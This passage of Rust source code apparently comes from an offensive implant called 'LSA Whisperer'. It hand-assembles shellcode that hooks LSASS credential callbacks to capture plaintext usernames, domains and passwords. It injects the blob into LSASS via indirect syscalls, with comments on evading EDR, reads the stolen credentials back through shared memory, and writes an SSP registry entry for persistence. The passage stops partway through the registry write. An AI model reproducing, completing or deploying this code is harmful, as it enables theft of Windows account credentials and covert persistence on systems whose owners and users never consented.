    //   jz +0x09                          2 bytes  (74 09)
    //   mov rsi, r12                      3 bytes
    //   lea rdi, [rbx+0x40]               4 bytes  (48 8D 7B 40)
    //   rep movsb                         2 bytes
    //   Total: 43 bytes → jz = 0x2B
    blob.extend_from_slice(&[0x74, 0x2B]);                     // jz skip_domain (43 bytes)
    // Read Length from UNICODE_STRING
    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24,
                             0x00]);                             // movzx eax, word [r12+0x00]
    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
    // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+lea(4)+rep(2) = 33 → 0x21
    blob.extend_from_slice(&[0x74, 0x21]);                     // jz skip_domain
    blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
    blob.extend_from_slice(&[0xB8, 0x80, 0x00, 0x00, 0x00]); // mov eax, 128
    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
    // Read Buffer from UNICODE_STRING
    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24,
                             0x08]);                             // mov r12, [r12+0x08]
    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
    // Inner skip: 3+4+2 = 9 bytes → jz = 0x09
    blob.extend_from_slice(&[0x74, 0x09]);                     // jz skip_domain
    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
    blob.extend_from_slice(&[0x48, 0x8D, 0x7B, 0x40]);       // lea rdi, [rbx+0x40] (domain at slot+64)
    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
    // skip_domain:

    // ── Copy Password (PUNICODE_STRING at r13+0x18) ───────────────
    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x18]);       // mov r12, [r13+0x18]
    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
    // Sequence after jz (to skip_password):
    //   movzx eax, word [r12+0x00]        6 bytes
    //   test eax, eax                     2 bytes
    //   jz +0x24                          2 bytes
    //   cmp eax, 256                      5 bytes
    //   jbe +5                            2 bytes
    //   mov eax, 256                      5 bytes
    //   mov ecx, eax                      2 bytes
    //   mov r12, [r12+0x08]               5 bytes
    //   test r12, r12                     3 bytes
    //   jz +0x0C                          2 bytes
    //   mov rsi, r12                      3 bytes
    //   lea rdi, [rbx+0x80]               7 bytes  (48 8D BB 80 00 00 00)
    //   rep movsb                         2 bytes
    //   Total: 46 bytes → jz = 0x2E
    blob.extend_from_slice(&[0x74, 0x2E]);                     // jz skip_password (46 bytes)
    // Read Length from UNICODE_STRING
    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24,
                             0x00]);                             // movzx eax, word [r12+0x00]
    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
    // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+lea(7)+rep(2) = 36 → 0x24
    blob.extend_from_slice(&[0x74, 0x24]);                     // jz skip_password
    blob.extend_from_slice(&[0x3D, 0x00, 0x01, 0x00, 0x00]); // cmp eax, 256
    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
    blob.extend_from_slice(&[0xB8, 0x00, 0x01, 0x00, 0x00]); // mov eax, 256
    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
    // Read Buffer from UNICODE_STRING
    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24,
                             0x08]);                             // mov r12, [r12+0x08]
    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
    // Inner skip: 3+7+2 = 12 bytes → jz = 0x0C
    blob.extend_from_slice(&[0x74, 0x0C]);                     // jz skip_password
    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
    blob.extend_from_slice(&[0x48, 0x8D, 0xBB,
                             0x80, 0x00, 0x00, 0x00]);         // lea rdi, [rbx+0x80] (password at slot+128)
    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
    // skip_password:

    // ── Set flags = FLAG_PLAINTEXT (cred_type=0 already from zeroing) ──
    blob.extend_from_slice(&[0xFF, 0x83, 0x04, 0x01,
                             0x00, 0x00]);                     // inc dword [rbx+0x104]

    // ── Memory barrier: ensure all CredSlot writes are visible before
    // the count update.  mfence provides a full barrier (both loads
    // and stores), stronger than sfence (stores only).  This ensures
    // the agent-side reader in another process never observes the
    // count increment before the slot data is committed.
    // V3-05 fix: replaced sfence with mfence for correct ordering.
    blob.extend_from_slice(&[0x0F, 0xAE, 0xF0]);             // mfence

    // ── Increment count (atomic) ──────────────────────────────────
    // V3-05 fix: we no longer update write_index here — lock xadd
    // already did that atomically above.  Only count needs incrementing.
    blob.extend_from_slice(&[0xF0, 0x41, 0xFF, 0x46, 0x08]); // lock inc dword [r14+8] (count)

    // ── epilogue ──────────────────────────────────────────────────
    // No NtUnmapViewOfSection or NtClose — the mapping persists.
    let accept_epilogue = blob.len();
    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
    blob.extend_from_slice(&[0x48, 0x81, 0xC4]);             // add rsp, 0x28
    blob.extend_from_slice(&0x28u32.to_le_bytes());
    blob.extend_from_slice(&[0x41, 0x5F]);                     // pop r15
    blob.extend_from_slice(&[0x41, 0x5E]);                     // pop r14
    blob.extend_from_slice(&[0x41, 0x5D]);                     // pop r13
    blob.extend_from_slice(&[0x41, 0x5C]);                     // pop r12
    blob.extend_from_slice(&[0x5F]);                         // pop rdi
    blob.extend_from_slice(&[0x5E]);                         // pop rsi
    blob.extend_from_slice(&[0x5B]);                         // pop rbx
    blob.extend_from_slice(&[0x5D]);                         // pop rbp
    blob.push(0xC3);                                         // ret

    // ── Patch near jumps in SpAcceptCredentials ───────────────────
    {
        let target = accept_epilogue;
        let rel32 = (target as i32) - (cred_jz_epilogue as i32 + 4);
        blob[cred_jz_epilogue..cred_jz_epilogue + 4].copy_from_slice(&rel32.to_le_bytes());
        let rel32 = (target as i32) - (base_jz_epilogue as i32 + 4);
        blob[base_jz_epilogue..base_jz_epilogue + 4].copy_from_slice(&rel32.to_le_bytes());
    }

    // ── Data section (0x500) ──────────────────────────────────────
    blob.resize(OFF_DATA, 0x90);
    // Write the section name as UTF-16LE (including null terminator)
    // shm_name was already set by SpInitialize above
    for &w in shm_name.iter() {
        blob.extend_from_slice(&w.to_le_bytes());
    }
    // Reserve space for OFF_STORED_BASE (8 bytes, zeroed)
    // V4-3-02: The section name is now up to 57 UTF-16LE chars (114 bytes),
    // padded to 0x80 (128 bytes) with 8 bytes for the stored base address.
    blob.resize(OFF_DATA + OFF_STORED_BASE + 8, 0x00);
    blob.resize(OFF_FT, 0x00);

    // ── Function pointer table (0x600) ────────────────────────────
    // Pre-resolve ntdll exports.  On Windows 10+ ntdll is at the same
    // base address in every process, so these addresses are valid in LSASS.
    let ntdll_base = unsafe {
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
    }
        .ok_or_else(|| anyhow!("cannot resolve ntdll base address"))?;

    let resolve = |name: &[u8]| -> Result<usize> {
        let hash = pe_resolve::hash_str(name);
        unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, hash) }
            .ok_or_else(|| anyhow!("cannot resolve ntdll export '{}'", String::from_utf8_lossy(name)))
    };

    let nt_create_section = resolve(b"NtCreateSection")?;
    let nt_open_section  = resolve(b"NtOpenSection")?;
    let nt_map_view      = resolve(b"NtMapViewOfSection")?;
    let nt_unmap_view    = resolve(b"NtUnmapViewOfSection")?;
    let nt_close         = resolve(b"NtClose")?;

    blob.extend_from_slice(&nt_create_section.to_le_bytes());
    blob.extend_from_slice(&nt_open_section.to_le_bytes());
    blob.extend_from_slice(&nt_map_view.to_le_bytes());
    blob.extend_from_slice(&nt_unmap_view.to_le_bytes());
    blob.extend_from_slice(&nt_close.to_le_bytes());

    log::info!(
        "LSA Whisperer: SSP blob built ({} bytes, SHM name {} chars)",
        blob.len(),
        name_chars,
    );

    assert!(blob.len() <= 0x1000, "SSP blob exceeds 4096 bytes");

    Ok(blob)
}

/// Trampoline table layout for SSP injection.
///
/// The first five fields mirror the function pointer table embedded in
/// the SSP blob at `OFF_FT` (NtCreateSection..NtClose).  The remaining
/// fields document additional syscall targets used by the injection
/// helper (`inject_ssp_into_lsass`) that are resolved via SSN-based
/// direct syscalls rather than through the in-blob table.
#[repr(C)]
pub struct TrampolineTable {
    pub nt_create_section: usize,
    pub nt_open_section: usize,
    pub nt_map_view_of_section: usize,
    pub nt_unmap_view_of_section: usize,
    pub nt_close: usize,
    pub nt_allocate_virtual_memory: usize,
    pub nt_write_virtual_memory: usize,
    pub nt_create_thread_ex: usize,
}

// ── Reflective SSP DLL builder ─────────────────────────────────────────────

/// Build a minimal reflective DLL that implements the SSP interface.
///
/// The DLL is a hand-crafted PE image that exports:
/// - `SpInitialize`  → creates shared memory section
/// - `SpShutDown`    → cleanup
/// - `SpAcceptCredentials` → credential capture
///
/// The DLL uses the agent's COFF/PE loader infrastructure to resolve
/// imports at runtime.
///
/// NOTE: Building a valid PE image from scratch is extremely complex.
/// Instead, we use a simpler approach: write a small piece of
/// position-independent trampoline code into LSASS that patches the
/// LSA dispatch table to intercept SpAcceptCredentials calls.
pub fn build_reflective_ssp_dll() -> Result<Vec<u8>> {
    build_ssp_blob()
}

// ── Shared memory IPC (agent side) ─────────────────────────────────────────

/// Open the shared memory section created by the SSP stub in LSASS
/// and read any captured credentials.
///
/// Returns the number of new credentials read.
pub fn read_captured_credentials(
    credentials: &mut Vec<super::lsa_whisperer::WhisperedCredential>,
) -> Result<usize> {
    use std::ptr;

    let mut section_handle: usize = 0;
    let mut status: i32;

    // Resolve NtOpenSection from ntdll via pe_resolve.
    let ntdll_base = unsafe {
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
    }
        .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;

    type FnNtOpenSection = unsafe extern "system" fn(
        *mut usize,       // SectionHandle
        u32,              // DesiredAccess (SECTION_MAP_READ | SECTION_MAP_WRITE)
        *mut std::ffi::c_void, // ObjectAttributes
    ) -> i32;

    let nt_open_section: FnNtOpenSection = unsafe {
        pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtOpenSection\0"))
            .map(|addr| std::mem::transmute::<usize, FnNtOpenSection>(addr))
            .ok_or_else(|| anyhow!("cannot resolve NtOpenSection"))?
    };

    type FnNtMapViewOfSection = unsafe extern "system" fn(
        usize,            // SectionHandle
        usize,            // ProcessHandle (-1 = current)
        *mut *mut std::ffi::c_void, // BaseAddress
        usize,            // ZeroBits
        usize,            // CommitSize
        *mut std::ffi::c_void, // SectionOffset (NULL)
        *mut usize,       // ViewSize (0 = map entire section)
        u32,              // InheritDisposition (1 = ViewShare)
        u32,              // AllocationType (0)
        u32,              // Win32Protect (PAGE_READWRITE)
    ) -> i32;

    let nt_map_view: FnNtMapViewOfSection = unsafe {
        pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtMapViewOfSection\0"),
        )
        .map(|addr| std::mem::transmute::<usize, FnNtMapViewOfSection>(addr))
        .ok_or_else(|| anyhow!("cannot resolve NtMapViewOfSection"))?
    };

    type FnNtUnmapViewOfSection = unsafe extern "system" fn(
        usize,            // ProcessHandle
        *mut std::ffi::c_void, // BaseAddress
    ) -> i32;

    let nt_unmap_view: FnNtUnmapViewOfSection = unsafe {
        pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtUnmapViewOfSection\0"),
        )
        .map(|addr| std::mem::transmute::<usize, FnNtUnmapViewOfSection>(addr))
        .ok_or_else(|| anyhow!("cannot resolve NtUnmapViewOfSection"))?
    };

    type FnNtClose = unsafe extern "system" fn(usize) -> i32;
    let nt_close: FnNtClose = unsafe {
        pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtClose\0"))
            .map(|addr| std::mem::transmute::<usize, FnNtClose>(addr))
            .ok_or_else(|| anyhow!("cannot resolve NtClose"))?
    };

    // Build OBJECT_ATTRIBUTES for the shared section name.
    #[repr(C)]
    struct ObjAttr {
        length: u32,
        root_directory: usize,
        object_name: *mut std::ffi::c_void,
        attributes: u32,
        security_descriptor: *mut std::ffi::c_void,
        security_qos: *mut std::ffi::c_void,
    }

    #[repr(C)]
    struct UniStr {
        length: u16,
        maximum_length: u16,
        _pad: u16,
        _pad2: u16,
        buffer: *mut u16,
    }

    let mut uni_name = UniStr {
        length: (SHM_NAME.len() - 1) as u16 * 2, // exclude null terminator
        maximum_length: (SHM_NAME.len() - 1) as u16 * 2,
        _pad: 0,
        _pad2: 0,
        buffer: SHM_NAME.as_ptr() as *mut u16,
    };

    let obj_attr = ObjAttr {
        length: std::mem::size_of::<ObjAttr>() as u32,
        root_directory: 0,
        object_name: &mut uni_name as *mut UniStr as *mut std::ffi::c_void,
        attributes: 0x40, // OBJ_CASE_INSENSITIVE
        security_descriptor: ptr::null_mut(),
        security_qos: ptr::null_mut(),
    };

    // SECTION_MAP_READ | SECTION_MAP_WRITE = 0x0004 | 0x0002 = 0x0006
    status = unsafe {
        nt_open_section(
            &mut section_handle,
            0x0006,
            &obj_attr as *const ObjAttr as *mut std::ffi::c_void,
        )
    };

    if status < 0 {
        // Section doesn't exist yet — SSP hasn't created it.
        return Ok(0);
    }

    // Map the section into our address space.
    let mut base_addr: *mut std::ffi::c_void = ptr::null_mut();
    let mut view_size: usize = 0;

    status = unsafe {
        nt_map_view(
            section_handle,
            -1isize as usize, // current process
            &mut base_addr,
            0,
            0,
            ptr::null_mut(),
            &mut view_size,
            1, // ViewShare
            0,
            0x04, // PAGE_READWRITE
        )
    };

    // Close the section handle regardless of mapping result.
    unsafe { nt_close(section_handle); }

    if status < 0 || base_addr.is_null() {
        return Err(anyhow!("NtMapViewOfSection for credential shared memory failed: {status:#x}"));
    }

    // Read the header and ring buffer.
    let shm_slice = unsafe {
        std::slice::from_raw_parts(base_addr as *const u8, SHM_SIZE)
    };

    // Acquire fence: ensures we see the most recent write_index / count
    // values written by the SSP in LSASS.  On x86-64 TSO this is largely
    // a no-op (loads are not reordered with other loads), but the fence
    // makes the intent explicit and is necessary on ARM64 if ever ported.
    std::sync::atomic::fence(std::sync::atomic::Ordering::Acquire);

    let write_idx = u32::from_le_bytes(shm_slice[0..4].try_into().unwrap_or([0; 4])) as usize;
    let read_idx = u32::from_le_bytes(shm_slice[4..8].try_into().unwrap_or([0; 4])) as usize;
    let count = u32::from_le_bytes(shm_slice[8..12].try_into().unwrap_or([0; 4])) as usize;

    let mut new_creds = 0usize;

    if count > 0 && write_idx != read_idx {
        // Read new credentials from read_idx to write_idx.
        let slots_start = 16; // header size
        let start = read_idx % RING_CAPACITY as usize;
        let end = write_idx % RING_CAPACITY as usize;

        let mut idx = start;
        loop {
            let slot_offset = slots_start + idx * CRED_SLOT_SIZE;
            if slot_offset + CRED_SLOT_SIZE > shm_slice.len() {
                break;
            }

            let slot_data = &shm_slice[slot_offset..slot_offset + CRED_SLOT_SIZE];

            // Decode the credential slot.
            let username = decode_utf16_field(&slot_data[0..64]);
            let domain = decode_utf16_field(&slot_data[64..128]);
            let password = decode_utf16_field(&slot_data[128..256]);
            let cred_type_tag = u32::from_le_bytes(
                slot_data[256..260].try_into().unwrap_or([0; 4]),
            );
            let _flags = u32::from_le_bytes(
                slot_data[260..264].try_into().unwrap_or([0; 4]),
            );

            let cred_type_name = match cred_type_tag {
                CRED_TYPE_MSV => "msv",
                CRED_TYPE_WDIGEST => "wdigest",
                CRED_TYPE_KERBEROS => "kerberos",
                CRED_TYPE_DPAPI => "dpapi",
                _ => "unknown",
            };

            if !username.is_empty() {
                credentials.push(super::lsa_whisperer::WhisperedCredential {
                    cred_type: cred_type_name.to_string(),
                    username,
                    domain,
                    password_or_hash: password,
                    format_: "plaintext".to_string(),
                });
                new_creds += 1;
            }

            idx = (idx + 1) % RING_CAPACITY as usize;
            if idx == end {
                break;
            }
        }

        // Advance the read index.
        let read_idx_bytes = (end as u32).to_le_bytes();
        // SAFETY: we have the section mapped PAGE_READWRITE.
        unsafe {
            let ptr = (base_addr as *mut u8).add(4);
            ptr.copy_from(read_idx_bytes.as_ptr(), 4);
        }
    }

    // Unmap the section.
    unsafe { nt_unmap_view(-1isize as usize, base_addr); }

    Ok(new_creds)
}

/// Decode a UTF-16LE field from a fixed-size byte buffer, stripping
/// trailing nulls.
fn decode_utf16_field(data: &[u8]) -> String {
    let wide: Vec<u16> = data
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .take_while(|&w| w != 0)
        .collect();
    String::from_utf16_lossy(&wide)
}

// ── LSASS injection via indirect syscalls ───────────────────────────────────

/// Open the LSASS process and return a handle via indirect syscall.
///
/// Access mask: `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD`
pub fn open_lsass_process() -> Result<usize> {
    use crate::syscalls::get_syscall_id;
    use std::ffi::c_void;

    // Find LSASS PID by hashing "lsass.exe" and looking up in the process list.
    let lsass_pid = find_lsass_pid()?;

    #[repr(C)]
    struct ClientId {
        unique_process: usize,
        unique_thread: usize,
    }

    let cid = ClientId {
        unique_process: lsass_pid as usize,
        unique_thread: 0,
    };

    let target = get_syscall_id("NtOpenProcess")
        .map_err(|e| anyhow!("NtOpenProcess SSN resolution: {e}"))?;

    let mut process_handle: usize = 0;

    // PROCESS_VM_OPERATION (0x0008) | PROCESS_VM_WRITE (0x0020) | PROCESS_CREATE_THREAD (0x0002)
    let desired_access: u32 = 0x0008 | 0x0020 | 0x0002;

    let status = invoke_nt_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            &mut process_handle as *mut _ as u64,
            desired_access as u64,
            std::ptr::null_mut::<c_void>() as u64, // ObjectAttributes
            &cid as *const _ as *mut c_void as u64,
        ],
    );

    if status < 0 || process_handle == 0 {
        return Err(anyhow!("NtOpenProcess(LSASS PID={lsass_pid}) failed: {status:#x}"));
    }

    log::info!(
        "LSA Whisperer: opened LSASS process (PID={lsass_pid}, handle={process_handle:#x})"
    );

    Ok(process_handle)
}

/// Find the LSASS process ID by enumerating running processes.
fn find_lsass_pid() -> Result<u32> {
    use sysinfo::System;
    let mut sys = System::new();
    sys.refresh_processes();

    for (pid, proc) in sys.processes() {
        let name = proc.name().to_lowercase();
        if name == "lsass.exe" {
            return Ok(pid.as_u32());
        }
    }

    Err(anyhow!("lsass.exe process not found"))
}

/// Inject the SSP blob into LSASS via indirect syscalls.
///
/// 1. Open LSASS process
/// 2. Allocate RW memory in LSASS via NtAllocateVirtualMemory
/// 3. Write the SSP blob via NtWriteVirtualMemory
/// 4. Flip protection to RX via NtProtectVirtualMemory
/// 5. Flush instruction cache via NtFlushInstructionCache
/// 6. Create a remote thread via NtCreateThreadEx to initialize the SSP
///
/// Returns the allocated base address in LSASS and the LSASS process handle.
pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
    use crate::syscalls::get_syscall_id;
    use crate::nt_handle::NtHandle;

    let lsass_handle = open_lsass_process()?;
    let _guard = NtHandle::new(lsass_handle);

    // Allocate memory in LSASS as PAGE_READWRITE (not RWX).
    // RWX allocations in LSASS are a loud EDR signal.
    let alloc_target = get_syscall_id("NtAllocateVirtualMemory")
        .map_err(|e| anyhow!("NtAllocateVirtualMemory SSN: {e}"))?;

    let mut base_addr: usize = 0;
    let mut region_size: usize = blob.len();

    // PAGE_READWRITE = 0x04, MEM_COMMIT | MEM_RESERVE = 0x3000
    let status = invoke_nt_syscall(
        alloc_target.ssn,
        alloc_target.gadget_addr,
        &[
            _guard.raw() as u64,
            &mut base_addr as *mut usize as u64,
            0, // ZeroBits
            &mut region_size as *mut usize as u64,
            0x3000u64, // MEM_COMMIT | MEM_RESERVE
            0x04u64,   // PAGE_READWRITE
        ],
    );

    if status < 0 {
        return Err(anyhow!("NtAllocateVirtualMemory in LSASS failed: {status:#x}"));
    }

    log::info!("LSA Whisperer: allocated {:#x} RW bytes in LSASS at {:#x}", blob.len(), base_addr);

    // Write the SSP blob into LSASS
    let write_target = get_syscall_id("NtWriteVirtualMemory")
        .map_err(|e| anyhow!("NtWriteVirtualMemory SSN: {e}"))?;

    let mut bytes_written: usize = 0;
    let status = invoke_nt_syscall(
        write_target.ssn,
        write_target.gadget_addr,
        &[
            _guard.raw() as u64,
            base_addr as u64,
            blob.as_ptr() as u64,
            blob.len() as u64,
            &mut bytes_written as *mut usize as u64,
        ],
    );

    if status < 0 {
        // Free the allocated memory on failure.
        if let Ok(free_tgt) = get_syscall_id("NtFreeVirtualMemory") {
            let mut free_size: usize = 0;
            let _ = invoke_nt_syscall(
                free_tgt.ssn,
                free_tgt.gadget_addr,
                &[
                    _guard.raw() as u64,
                    &mut base_addr as *mut usize as u64,
                    &mut free_size as *mut usize as u64,
                    0x00008000u64, // MEM_RELEASE
                ],
            );
        }
        return Err(anyhow!("NtWriteVirtualMemory to LSASS failed: {status:#x}"));
    }

    // ── Flip memory protection from RW → RX ────────────────────────
    // The blob has been written; it now only needs to be readable and
    // executable.  This avoids leaving RWX pages in LSASS.
    let protect_target = get_syscall_id("NtProtectVirtualMemory")
        .map_err(|e| anyhow!("NtProtectVirtualMemory SSN: {e}"))?;

    let mut protect_base: usize = base_addr;
    let mut protect_size: usize = region_size;
    let mut old_protect: u32 = 0;

    // PAGE_EXECUTE_READ = 0x20
    let status = invoke_nt_syscall(
        protect_target.ssn,
        protect_target.gadget_addr,
        &[
            _guard.raw() as u64,
            &mut protect_base as *mut usize as u64,
            &mut protect_size as *mut usize as u64,
            0x20u64,                        // PAGE_EXECUTE_READ
            &mut old_protect as *mut u32 as u64,
        ],
    );

    if status < 0 {
        log::warn!("LSA Whisperer: NtProtectVirtualMemory(RW→RX) failed: {status:#x}, proceeding with RW");
        // Non-fatal: the code is still writable.  Continue — the SSP will
        // execute on an RW page if the protection change was denied.
    }

    // Flush the instruction cache so LSASS sees the written blob as code.
    if let Ok(flush_tgt) = get_syscall_id("NtFlushInstructionCache") {
        let _ = invoke_nt_syscall(
            flush_tgt.ssn,
            flush_tgt.gadget_addr,
            &[
                _guard.raw() as u64,
                base_addr as u64,
                region_size as u64,
            ],
        );
    }

    // Create a remote thread to execute the SSP initialization.
    // The thread starts at the SpInitialize entry point (offset 0x000).
    let thread_target = get_syscall_id("NtCreateThreadEx")
        .map_err(|e| anyhow!("NtCreateThreadEx SSN: {e}"))?;

    let mut thread_handle: usize = 0;

    // THREAD_INJECT_ACCESS = 0x0002 (THREAD_SET_CONTEXT | THREAD_GET_CONTEXT)
    // We use 0x1FFFFF for full access since we need to wait on the thread.
    let status = invoke_nt_syscall(
        thread_target.ssn,
        thread_target.gadget_addr,
        &[
            &mut thread_handle as *mut usize as u64,
            0x1FFFFFu64, // THREAD_ALL_ACCESS
            0,           // ObjectAttributes
            _guard.raw() as u64,
            base_addr as u64, // StartRoutine = SpInitialize at offset 0
            0,                // Argument
            0,                // CreateSuspended = false
            0,                // StackZeroBits
            0,                // StackSize
            0,                // MaximumStackSize
            0,                // AttributeList
        ],
    );

    if status < 0 {
        // Free memory on failure.
        if let Ok(free_tgt) = get_syscall_id("NtFreeVirtualMemory") {
            let mut free_size: usize = 0;
            let _ = invoke_nt_syscall(
                free_tgt.ssn,
                free_tgt.gadget_addr,
                &[
                    _guard.raw() as u64,
                    &mut base_addr as *mut usize as u64,
                    &mut free_size as *mut usize as u64,
                    0x00008000u64,
                ],
            );
        }
        return Err(anyhow!("NtCreateThreadEx for SSP init in LSASS failed: {status:#x}"));
    }

    // Close the thread handle.
    if let Ok(close_tgt) = get_syscall_id("NtClose") {
        let _ = invoke_nt_syscall(
            close_tgt.ssn,
            close_tgt.gadget_addr,
            &[thread_handle as u64],
        );
    }

    log::info!(
        "LSA Whisperer: SSP blob injected into LSASS at {:#x}, initialization thread launched",
        base_addr
    );

    Ok((base_addr, _guard.raw()))
}

/// Free previously allocated LSASS memory (used during cleanup).
pub fn free_lsass_memory(process_handle: usize, base_addr: usize) -> Result<()> {
    use crate::syscalls::get_syscall_id;

    let free_target = get_syscall_id("NtFreeVirtualMemory")
        .map_err(|e| anyhow!("NtFreeVirtualMemory SSN: {e}"))?;

    let mut addr = base_addr;
    let mut free_size: usize = 0;

    let status = invoke_nt_syscall(
        free_target.ssn,
        free_target.gadget_addr,
        &[
            process_handle as u64,
            &mut addr as *mut usize as u64,
            &mut free_size as *mut usize as u64,
            0x00008000u64, // MEM_RELEASE
        ],
    );

    if status < 0 {
        log::warn!("LSA Whisperer: NtFreeVirtualMemory in LSASS failed: {status:#x}");
        return Err(anyhow!("NtFreeVirtualMemory in LSASS failed: {status:#x}"));
    }

    log::info!("LSA Whisperer: freed LSASS memory at {:#x}", base_addr);
    Ok(())
}

// ── SSP package registration ───────────────────────────────────────────────

/// The internal SSP package name used for LSA registration.
///
/// This must be a short ASCII string that will appear in the
/// `Security Packages` registry value.  LSA uses this name to locate
/// the SSP DLL — but since we inject directly into LSASS memory, LSA
/// never loads us through this path.  Registration is still desirable
/// so that LSA calls `SpAcceptCredentials` through its normal SSP
/// dispatch after the next LSA service restart.
const SSP_PACKAGE_NAME: &str = "orchssp";

/// Register the SSP package with LSA by appending the package name to
/// the `Security Packages` value in the LSA registry key.
///
/// # What this does
///
/// Appends `SSP_PACKAGE_NAME` to the `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`
/// `REG_MULTI_SZ` value.  After the next LSA restart (or a call to
/// `AddSecurityPackage`), LSA will attempt to load an SSP DLL with
/// this name.  Since we have already injected our shellcode blob
/// directly into LSASS, the in-memory hook intercepts credential
/// callbacks regardless of whether the DLL file exists on disk.
///
/// # Why registry + injection
///
/// The pure injection approach works immediately but is volatile — it
/// disappears when LSASS restarts.  The registry entry ensures
/// persistence: on reboot, LSA will try to load the named SSP.  If
/// the DLL is not on disk, the load silently fails, but our
/// injection framework will re-inject on the next agent cycle.
///
/// # OPSEC note
///
/// Modifying this registry key is a well-known indicator.  Operators
/// should weigh persistence vs. detection risk.  Set
/// `register_with_lsa = false` in the profile to skip this step.
pub fn register_ssp_package() -> Result<()> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    const LSA_KEY: &str = r"SYSTEM\CurrentControlSet\Control\Lsa";
    const LSA_VALUE: &str = "Security Packages";

    // Open the LSA registry key.
    let key_wide: Vec<u16> = OsStr::new(LSA_KEY).encode_wide().chain(std::iter::once(0)).collect();
    let val_wide: Vec<u16> = OsStr::new(LSA_VALUE).encode_wide().chain(std::iter::once(0)).collect();
    let pkg_wide: Vec<u16> = OsStr::new(SSP_PACKAGE_NAME).encode_wide().chain(std::iter::once(0)).collect();

    let mut hkey: winapi::shared::minwindef::HKEY = std::ptr::null_mut();
    let err = unsafe {
        winapi::um::winreg::RegOpenKeyExW(
            winapi::um::winreg::HKEY_LOCAL_MACHINE,
            key_wide.as_ptr(),
            0,
            winapi::um::winnt::KEY_QUERY_VALUE | winapi::um::winnt::KEY_SET_VALUE,
            &mut hkey,
        )
    };
    if err as u32 != winapi::shared::winerror::ERROR_SUCCESS {
        return Err(anyhow!(
            "RegOpenKeyExW({LSA_KEY}) failed: win32 error {err:#x}"
        ));
    }

    // Read the current REG_MULTI_SZ value.
    let mut buf_len: u32 = 0;
    let mut reg_type: u32 = 0;
    unsafe {
        winapi::um::winreg::RegQueryValueExW(
            hkey,
            val_wide.as_ptr(),
            std::ptr::null_mut(),
            &mut reg_type,
            std::ptr::null_mut(),
            &mut buf_len,
        )
    };

    // Allocate buffer and read.
    let mut buf: Vec<u8> = vec![0u8; buf_len as usize + (pkg_wide.len() * 2 + 2)];
    unsafe {
        winapi::um::winreg::RegQueryValueExW(
            hkey,
            val_wide.as_ptr(),
            std::ptr::null_mut(),
            &mut reg_type,
            buf.as_mut_ptr(),
            &mut buf_len,
        )
    };

    // Parse the existing REG_MULTI_SZ: sequence of null-terminated UTF-16LE
    // strings, terminated by an extra null.
    let existing_wide: Vec<u16> = buf[..buf_len as usize]
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();

    // Check if our package name is already present.
    let mut already_registered = false;
    {
        let mut start = 0;
        while start < existing_wide.len() {
            let end = existing_wide[start..].iter().position(|&w| w == 0);
            match end {
                Some(0) => break, // double-null terminator
                Some(len) => {
                    let s: String = String::from_utf16_lossy(&existing_wide[start..start + len]);
                    if s.eq_ignore_ascii_case(SSP_PACKAGE_NAME) {
                        already_registered = true;
                        break;
                    }
                    start += len + 1;
                }
                None => break,
            }
        }
    }

    if already_registered {
        log::info!("LSA Whisperer: SSP package '{SSP_PACKAGE_NAME}' already registered");
        unsafe { winapi::um::winreg::RegCloseKey(hkey); }
        return Ok(());
    }

    // Append our package name to the REG_MULTI_SZ.
    // Build the new value: existing data + new null-terminated string + final null.
    let mut new_value: Vec<u16> = existing_wide.clone();
    // Ensure the existing data ends with exactly one null (between strings).
    if !new_value.is_empty() && new_value.last() == Some(&0) {
        // Remove trailing double-null if present.
        while new_value.last() == Some(&0) {
            new_value.pop();
        }
        new_value.push(0); // single null separator
    }
    // Append our package name + null.
    for &w in &pkg_wide {
        new_value.push(w);
    }
    new_value.push(0); // final null terminator for REG_MULTI_SZ

    let new_bytes = unsafe {
        std::slice::from_raw_parts(
            new_value.as_ptr() as *const u8,
            new_value.len() * 2,
        )
    };

    let err = unsafe {
        winapi::um::winreg::RegSetValueExW(
            hkey,
            val_wide.as_ptr(),
